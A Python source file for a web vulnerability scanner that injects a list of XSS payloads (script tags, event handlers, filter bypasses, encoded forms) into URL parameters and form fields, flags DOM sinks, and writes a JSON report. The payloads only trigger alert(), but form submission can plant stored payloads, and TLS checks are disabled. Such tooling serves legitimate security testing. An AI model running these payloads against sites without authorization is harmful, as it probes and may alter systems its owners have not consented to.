"""
Cross-Site Scripting (XSS) Vulnerability Scanner
Advanced detection of Stored, Reflected, and DOM-based XSS vulnerabilities
"""

import requests
from colorama import Fore, Style, init
import logging
import json
import time
from typing import Dict, List, Tuple
from bs4 import BeautifulSoup
import re
from urllib.parse import urljoin, urlparse

init(autoreset=True)
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class XSSScanner:
    """Comprehensive XSS vulnerability detection engine"""
    
    def __init__(self, target: str, verbose: bool = False):
        self.target = target if target.startswith(('http://', 'https://')) else f"https://{target}"
        self.verbose = verbose
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0 (XSS Scanner)'})
        self.vulnerabilities = []
        
        # Comprehensive XSS payloads
        self.payloads = {
            'basic': [
                '<script>alert("XSS")</script>',
                '<img src=x onerror="alert(\'XSS\')">',
                '<svg onload="alert(\'XSS\')">',
                '<body onload="alert(\'XSS\')">',
            ],
            'event_handlers': [
                '<input onfocus="alert(\'XSS\')" autofocus>',
                '<marquee onstart="alert(\'XSS\')">',
                '<details open ontoggle="alert(\'XSS\')">',
                '<iframe onload="alert(\'XSS\')">',
                '<video src=x onerror="alert(\'XSS\')">',
                '<audio src=x onerror="alert(\'XSS\')">',
            ],
            'dom_based': [
                'javascript:alert("XSS")',
                'data:text/html,<script>alert("XSS")</script>',
                'vbscript:alert("XSS")',
            ],
            'html_attributes': [
                '"><script>alert("XSS")</script>',
                '\' onmouseover="alert(\'XSS\')"',
                '" style="background:url(javascript:alert(\'XSS\'));"',
                '" autofocus onfocus="alert(\'XSS\');"',
            ],
            'bypasses': [
                '<scr<script>ipt>alert("XSS")</script>',
                '<script>alert("XSS")//</script>',
                '<script>alert(String.fromCharCode(88,83,83))</script>',
                '<<script>alert("XSS");//<</script>',
                '<ScRiPt>alert("XSS")</sCrIpT>',
            ],
            'encoded': [
                '&#60;script&#62;alert("XSS")&#60;/script&#62;',
                '%3Cscript%3Ealert("XSS")%3C/script%3E',
                '&#x3C;script&#x3E;alert("XSS")&#x3C;/script&#x3E;',
            ]
        }
        
        self.results = {
            'target': self.target,
            'timestamp': time.time(),
            'vulnerabilities': [],
            'parameters_tested': [],
            'severity_breakdown': {'critical': 0, 'high': 0, 'medium': 0}
        }
    
    def extract_forms(self) -> List[Dict]:
        """Extract all forms from target application"""
        forms = []
        try:
            response = self.session.get(self.target, timeout=10, verify=False)
            soup = BeautifulSoup(response.content, 'html.parser')
            
            for form in soup.find_all('form'):
                form_data = {
                    'action': form.get('action', ''),
                    'method': form.get('method', 'GET').upper(),
                    'inputs': []
                }
                
                for input_field in form.find_all(['input', 'textarea', 'select']):
                    form_data['inputs'].append({
                        'name': input_field.get('name', ''),
                        'type': input_field.get('type', 'text')
                    })
                
                forms.append(form_data)
        except Exception as e:
            logger.warning(f"Form extraction failed: {e}")
        
        return forms
    
    def extract_url_parameters(self) -> List[str]:
        """Extract URL parameters from target"""
        parsed = urlparse(self.target)
        params = []
        
        if parsed.query:
            for param in parsed.query.split('&'):
                if '=' in param:
                    params.append(param.split('=')[0])
        
        # Common parameter names
        common_params = ['q', 'search', 'keyword', 'id', 'page', 'sort', 'filter', 'name', 'email']
        params.extend(common_params)
        
        return list(set(params))
    
    def test_reflected_xss(self, url: str, param: str) -> List[Dict]:
        """Test for reflected XSS vulnerabilities"""
        vulnerabilities = []
        
        for payload_type, payloads in self.payloads.items():
            for payload in payloads:
                try:
                    # Test with GET parameter
                    test_url = f"{url.split('?')[0]}?{param}={payload}"
                    response = self.session.get(test_url, timeout=10, verify=False)
                    
                    # Check if payload is reflected unescaped
                    if payload in response.text and '<script>' in payload:
                        vuln = {
                            'type': 'Reflected XSS',
                            'parameter': param,
                            'payload': payload[:50],
                            'payload_type': payload_type,
                            'severity': 'High',
                            'url': test_url[:100]
                        }
                        vulnerabilities.append(vuln)
                        logger.warning(f"XSS Found: {param} with {payload_type}")
                    
                    # Check for partial reflection
                    elif re.search(re.escape(payload), response.text, re.IGNORECASE):
                        if not any(escape in response.text for escape in ['&lt;', '&amp;', '&#']):
                            vuln = {
                                'type': 'Possible Reflected XSS',
                                'parameter': param,
                                'payload': payload[:50],
                                'severity': 'Medium',
                                'url': test_url[:100]
                            }
                            vulnerabilities.append(vuln)
                
                except requests.exceptions.Timeout:
                    logger.debug(f"Timeout on {url} with payload {payload[:20]}")
                except Exception as e:
                    if self.verbose:
                        logger.debug(f"Test failed: {e}")
        
        return vulnerabilities
    
    def test_dom_xss(self) -> List[Dict]:
        """Test for DOM-based XSS"""
        vulnerabilities = []
        
        try:
            response = self.session.get(self.target, timeout=10, verify=False)
            soup = BeautifulSoup(response.content, 'html.parser')
            
            # Look for vulnerable DOM sinks
            dangerous_patterns = [
                r'\.innerHTML\s*=',
                r'\.outerHTML\s*=',
                r'\.write\(',
                r'eval\(',
                r'setTimeout\(',
                r'location\.href\s*=',
            ]
            
            scripts = soup.find_all('script')
            for script in scripts:
                script_content = script.string
                if script_content:
                    for pattern in dangerous_patterns:
                        if re.search(pattern, script_content):
                            # Check if user input flows to sink
                            if 'location' in script_content or 'document' in script_content:
                                vuln = {
                                    'type': 'DOM-based XSS',
                                    'severity': 'High',
                                    'pattern': pattern,
                                    'code': script_content[:100]
                                }
                                vulnerabilities.append(vuln)
        except Exception as e:
            logger.warning(f"DOM XSS test failed: {e}")
        
        return vulnerabilities
    
    def test_stored_xss(self, forms: List[Dict]) -> List[Dict]:
        """Test for stored XSS in form submissions"""
        vulnerabilities = []
        
        for form in forms:
            if not form['inputs']:
                continue
            
            for payload_type, payloads in self.payloads.items():
                for payload in payloads[:2]:  # Limit payloads to speed up testing
                    try:
                        form_data = {}
                        for input_field in form['inputs']:
                            form_data[input_field['name']] = payload
                        
                        form_url = urljoin(self.target, form['action'])
                        
                        if form['method'] == 'POST':
                            response = self.session.post(form_url, data=form_data, timeout=10, verify=False)
                        else:
                            response = self.session.get(form_url, params=form_data, timeout=10, verify=False)
                        
                        # Check if payload is stored and reflected on response/redirect
                        if payload in response.text:
                            vuln = {
                                'type': 'Potential Stored XSS',
                                'form_action': form['action'],
                                'payload': payload[:50],
                                'severity': 'Critical'
                            }
                            vulnerabilities.append(vuln)
                    except Exception as e:
                        if self.verbose:
                            logger.debug(f"Form test failed: {e}")
        
        return vulnerabilities
    
    def generate_report(self) -> Dict:
        """Generate comprehensive XSS scan report"""
        print(f"\n{Fore.CYAN}[*] XSS Vulnerability Scanner{Style.RESET_ALL}")
        print("=" * 60)
        
        # Extract inputs
        forms = self.extract_forms()
        params = self.extract_url_parameters()
        
        print(f"{Fore.BLUE}[*] Testing {len(forms)} forms and {len(params)} parameters{Style.RESET_ALL}")
        
        # Test reflected XSS
        for param in params:
            vulns = self.test_reflected_xss(self.target, param)
            self.vulnerabilities.extend(vulns)
        
        # Test DOM XSS
        dom_vulns = self.test_dom_xss()
        self.vulnerabilities.extend(dom_vulns)
        
        # Test stored XSS
        stored_vulns = self.test_stored_xss(forms)
        self.vulnerabilities.extend(stored_vulns)
        
        # Build results
        self.results['vulnerabilities'] = self.vulnerabilities
        self.results['total_found'] = len(self.vulnerabilities)
        
        # Display results
        if self.vulnerabilities:
            print(f"\n{Fore.RED}[!] XSS Vulnerabilities Found: {len(self.vulnerabilities)}{Style.RESET_ALL}")
            for vuln in self.vulnerabilities[:10]:
                print(f"  Type: {vuln.get('type', 'Unknown')}")
                print(f"  Severity: {vuln.get('severity', 'Unknown')}")
                print(f"  Details: {vuln.get('parameter', vuln.get('form_action', 'N/A'))}")
        else:
            print(f"{Fore.GREEN}[+] No obvious XSS vulnerabilities detected{Style.RESET_ALL}")
        
        return self.results


def xss_scan(target: str, verbose: bool = False) -> Dict:
    """Main XSS scanning function"""
    try:
        scanner = XSSScanner(target, verbose)
        results = scanner.generate_report()
        
        # Save results
        filename = f"xss_scan_{int(time.time())}.json"
        with open(filename, 'w') as f:
            json.dump(results, f, indent=2)
        
        print(f"\n{Fore.GREEN}[+] Report saved to {filename}{Style.RESET_ALL}")
        return results
    except Exception as e:
        logger.error(f"XSS scan failed: {e}")
        return {'error': str(e)}